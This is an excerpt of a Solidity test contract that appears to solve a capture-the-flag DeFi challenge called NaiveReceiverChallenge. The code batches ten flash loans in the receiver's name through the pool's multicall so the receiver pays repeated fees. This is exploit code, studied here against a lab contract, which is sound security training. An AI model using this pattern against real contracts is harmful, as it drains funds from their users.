...
contract NaiveReceiverChallenge is Test {
    ...
    function test_naiveReceiver() public checkSolvedByPlayer {
        ...
        for (uint256 i = 0; i < 10; i++) {
            data[i] =
                abi.encodeWithSelector(pool.flashLoan.selector, receiver, address(weth), WETH_IN_RECEIVER, bytes(""));
        }
        ...
        bytes memory multicallData = abi.encodeCall(pool.multicall, data);
